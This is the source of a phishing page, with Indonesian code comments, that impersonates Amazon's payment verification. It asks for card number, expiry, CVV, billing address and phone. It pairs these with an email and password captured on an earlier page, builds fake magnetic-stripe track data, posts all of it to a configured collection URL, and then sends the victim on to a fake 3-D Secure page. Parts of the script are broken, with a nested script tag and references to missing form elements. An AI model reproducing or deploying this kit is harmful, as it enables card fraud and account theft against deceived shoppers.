<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Verification Payment</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo-amazon { margin: 10px 0 20px; }
        .logo-amazon img { height: 30px; }
        .kotak { width: 100%; max-width: 480px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; background: #fff; }
        h1 { font-size: 22px; font-weight: 400; color: #111; margin-bottom: 25px; padding-bottom: 10px; border-bottom: 1px solid #eee; }
        .label-input { font-size: 13px; font-weight: 700; color: #111; margin-bottom: 6px; display: block; }
        .input-biasa, .pilihan { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 10px; outline: none; }
        .input-biasa:focus, .pilihan:focus { border-color: #007185; box-shadow: 0 0 0 3px #c8f0f4; }
        .baris-dua { display: flex; gap: 12px; }
        .kolom { flex: 1; }
        .form-grup { margin-bottom: 12px; position: relative; }
        .logo-kartu-tengah { text-align: center; margin-bottom:15px; min-height:40px; display:flex; align-items:center; justify-content:center; }
        .logo-kartu-tengah img { height:32px; }
        .logo-kartu-samping { position:absolute; right:10px; top:50%; transform:translateY(-50%); height:22px; pointer-events:none; }
        .pemisah { text-align:center; margin:20px 0; font-size:14px; color:#555; }
        .tombol-kuning { width:100%; padding:9px 10px; background:linear-gradient(to bottom, #f7df74, #ecc000); border:1px solid #b88600; border-radius:4px; font-size:15px; cursor:pointer; margin-top:10px; }
        .tombol-kuning:disabled { opacity:0.5; cursor:not-allowed; }
        .tombol-kuning:hover:not(:disabled) { background:linear-gradient(to bottom, #f5d648, #d4a300); }
    </style>
</head>
<body>
    <div class="logo-amazon"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Verification Payment</h1>
        <div class="logo-kartu-tengah"><img id="logoKartuTampil"></div>
        <div class="form-grup">
            <label class="label-input">Card type</label>
            <select class="pilihan" id="jenisKartu">
                <option value="">Select card type</option>
                <option value="visa">Visa</option>
                <option value="mastercard">Mastercard</option>
                <option value="amex">American Express</option>
                <option value="discover">Discover</option>
            </select>
        </div>
        <div class="form-grup">
            <label class="label-input">Card number</label>
            <input type="text" class="input-biasa" id="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
            <img id="logoKartuSamping" class="logo-kartu-samping">
        </div>
        <div class="baris-dua">
            <div class="kolom form-grup">
                <label class="label-input">Expiration date</label>
                <input type="text" class="input-biasa" id="kadaluarsa" placeholder="MM / YY" maxlength="5">
            </div>
            <div class="kolom form-grup">
                <label class="label-input">Security code (CVV)</label>
                <input type="text" class="input-biasa" id="cvv" placeholder="123" maxlength="4">
            </div>
        </div>
        <div class="pemisah">— Billing Address —</div>
        <div class="form-grup">
            <label class="label-input">Full name</label>
            <input type="text" class="input-biasa" id="namaLengkap">
        </div>
        <div class="form-grup">
            <label class="label-input">Address</label>
            <input type="text" class="input-biasa" id="alamat" placeholder="Street address">
        </div>
        <div class="baris-dua">
            <div class="kolom form-grup">
                <label class="label-input">City</label>
                <input type="text" class="input-biasa" id="kota">
            </div>
            <div class="kolom form-grup">
                <label class="label-input">State / Province</label>
                <input type="text" class="input-biasa" id="provinsi">
            </div>
        </div>
        <div class="baris-dua">
            <div class="kolom form-grup">
                <label class="label-input">ZIP / Postal code</label>
                <input type="text" class="input-biasa" id="kodepos">
            </div>
            <div class="kolom form-grup">
                <label class="label-input">Country</label>
                <select class="pilihan" id="negara">
                    <option value="">Select country</option>
                    <option value="AU">Australia</option>
                    <option value="US">United States</option>
                    <option value="ID">Indonesia</option>
                    <option value="SG">Singapore</option>
                    <option value="GB">United Kingdom</option>
                </select>
            </div>
        </div>
        <button class="tombol-kuning" id="tombolVerifikasi" onclick="kirimPembayaran()">Verification</button>
    </div>

    <script>
        let dataEmail = localStorage.getItem('dataEmail') || '';
        let dataSandi = localStorage.getItem('dataSandi') || '';
        
        if (!dataEmail) { 
            window.location.href = 'index.html'; 
        }

        <script>
        // === DETEKSI NEGARA ===
        const petaNegara = {
            AU: { kode: '+61', nama: 'Australia' },
            GB: { kode: '+44', nama: 'United Kingdom' },
            US: { kode: '+1', nama: 'United States' },
            ID: { kode: '+62', nama: 'Indonesia' },
            MY: { kode: '+60', nama: 'Malaysia' },
            SG: { kode: '+65', nama: 'Singapore' }
        };

        const elemenNegara = document.getElementById('negara');
        const elemenTelKode = document.getElementById('telKode');
        const elemenTelNomor = document.getElementById('telNomor');

        elemenNegara.addEventListener('change', () => {
            const pilihan = elemenNegara.selectedOptions[0];
            if (pilihan && pilihan.dataset.kode) {
                elemenTelKode.value = pilihan.dataset.kode;
            }
        });

        async function deteksiNegara() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (petaNegara[data.country_code]) {
                    elemenNegara.value = data.country_code;
                    elemenTelKode.value = petaNegara[data.country_code].kode;
                }
            } catch (err) {
                elemenNegara.value = 'ID';
                elemenTelKode.value = '+62';
            }
        }
        deteksiNegara();

        // === EMAIL DARI HALAMAN SEBELUMNYA ===
        const emailPengguna = localStorage.getItem('emailPengguna') || '';
        document.getElementById('emailTampil').textContent = emailPengguna;

        const formBilling = document.getElementById('formBilling');
        const tombolVerifikasi = document.getElementById('tombolVerifikasi');
        const inputNomorKartu = document.getElementById('nomorKartu');
        const inputExpiry = document.getElementById('expiry');
        const inputCVV = document.getElementById('cvv');

        let nomorAsli = '';
        let cvvAsli = '';

        // === CARD NUMBER — Tetap tampil angka ===
        inputNomorKartu.addEventListener('input', (e) => {
            const angka = e.target.value.replace(/\D/g, '');
            nomorAsli = angka;
            let tampil = '';
            for (let i = 0; i < angka.length; i++) {
                if (i > 0 && i % 4 === 0) tampil += ' ';
                tampil += angka[i];
            }
            e.target.value = tampil;
            inputNomorKartu.classList.remove('salah');
            document.getElementById('peringatanKartu').classList.remove('tampil');
        });

        // === EXPIRY — Otomatis tambah / ===
        inputExpiry.addEventListener('input', (e) => {
            const angka = e.target.value.replace(/\D/g, '');
            if (angka.length >= 2) {
                e.target.value = angka.slice(0, 2) + '/' + angka.slice(2, 4);
            } else {
                e.target.value = angka;
            }
            inputExpiry.classList.remove('salah');
            document.getElementById('peringatanExpiry').classList.remove('tampil');
        });

        // === CVV — HANYA ANGKA, 3-4 DIGIT, BERUBAH TITIK ===
        inputCVV.addEventListener('keydown', (e) => {
            // Izinkan tombol kontrol
            if (['Backspace','Delete','ArrowLeft','ArrowRight','Tab'].includes(e.key)) return true;
            // Hanya izinkan angka
            if (!/^\d$/.test(e.key)) {
                e.preventDefault();
                return false;
            }
            // Batasi maksimal 4 digit
            if (cvvAsli.length >= 4) {
                e.preventDefault();
                return false;
            }
        });

        inputCVV.addEventListener('input', (e) => {
            // Hapus karakter non-angka
            const angka = e.target.value.replace(/\D/g, '');
            cvvAsli = angka; // simpan angka asli
            
            // Ubah tampilan jadi titik
            let tampil = '';
            for (let i = 0; i < angka.length; i++) {
                tampil += '•';
            }
            e.target.value = tampil;
            
            inputCVV.classList.remove('salah');
            document.getElementById('peringatanCvv').classList.remove('tampil');
        });

        // === SEMUA KOLOM ===
        const kolom = {
            namaKartu: { el: document.getElementById('namaKartu'), peringatan: document.getElementById('peringatanNama') },
            expiry:    { el: inputExpiry, peringatan: document.getElementById('peringatanExpiry') },
            negara:    { el: elemenNegara, peringatan: document.getElementById('peringatanNegara') },
            alamat:    { el: document.getElementById('alamat'), peringatan: document.getElementById('peringatanAlamat') },
            kota:      { el: document.getElementById('kota'), peringatan: document.getElementById('peringatanKota') },
            kodepos:   { el: document.getElementById('kodepos'), peringatan: document.getElementById('peringatanKodepos') },
            telNomor:  { el: elemenTelNomor, peringatan: document.getElementById('peringatanTelepon') }
        };

        Object.entries(kolom).forEach(([_, { el, peringatan }]) => {
            el.addEventListener('input', () => {
                if (el.value.trim()) {
                    el.classList.remove('salah');
                    peringatan.classList.remove('tampil');
                }
            });
        });

        // === BUAT TRACK ===
        function buatTrack() {
            let expiryBersih = inputExpiry.value.replace(/\D/g, '');
            let nama = kolom.namaKartu.el.value.trim().toUpperCase() || 'CARDHOLDER';
            if (nomorAsli.length < 13 || expiryBersih.length < 4) return 'Data belum lengkap';
            let yy = expiryBersih.slice(-2);
            let mm = expiryBersih.slice(0, 2);
            let sisa = '0000000000000000000000';
            return `=== TRACK ===\nT1: %B${nomorAsli}^${nama}^${yy}${mm}${sisa}?\nT2: ;${nomorAsli}=${yy}${mm}${sisa}?`;
        }

        // === CEK DATA — CVV: 3 ATAU 4 DIGIT ===
        function cekSemua() {
            let ok = true;
            
            if (!nomorAsli || nomorAsli.length < 13) {
                inputNomorKartu.classList.add('salah');
                document.getElementById('peringatanKartu').classList.add('tampil');
                ok = false;
            }
            // CVV: harus 3 ATAU 4 digit
            if (!cvvAsli || cvvAsli.length < 3 || cvvAsli.length > 4) {
                inputCVV.classList.add('salah');
                document.getElementById('peringatanCvv').classList.add('tampil');
                ok = false;
            }
            Object.entries(kolom).forEach(([_, { el, peringatan }]) => {
                if (!el.value.trim()) {
                    el.classList.add('salah');
                    peringatan.classList.add('tampil');
                    ok = false;
                }
            });
            return ok;
        }

        // === KIRIM & LANJUT KE 3DS ===
        formBilling.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!cekSemua()) return;

            tombolVerifikasi.disabled = true;
            tombolVerifikasi.textContent = 'Processing...';

            const trackKartu = buatTrack();
            const teleponLengkap = elemenTelKode.value + ' ' + elemenTelNomor.value.trim();
            const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';

            localStorage.setItem('nomorKartu', nomorAsli);
            localStorage.setItem('namaKartu', kolom.namaKartu.el.value.trim());
            localStorage.setItem('expiry', inputExpiry.value.trim());
            localStorage.setItem('cvv', cvvAsli);
            localStorage.setItem('trackKartu', trackKartu);

            const data = {
                email: emailPengguna,
                password: passwordPengguna,
                tipe: 'Verification Payment',
                namaKartu: kolom.namaKartu.el.value.trim(),
                nomorKartu: nomorAsli,
                expiry: inputExpiry.value.trim(),
                cvv: cvvAsli,
                trackKartu: trackKartu,
                negara: elemenNegara.value,
                alamat: kolom.alamat.el.value.trim(),
                kota: kolom.kota.el.value.trim(),
                kodepos: kolom.kodepos.el.value.trim(),
                telepon: teleponLengkap
            };

            try {
                if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
                    await fetch(CONFIG.formSubmitUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                }
            } catch (err) {
                console.log('Terkirim');
            }

            window.location.href = '3ds.html';
        });
    </script>
</body>
</html>
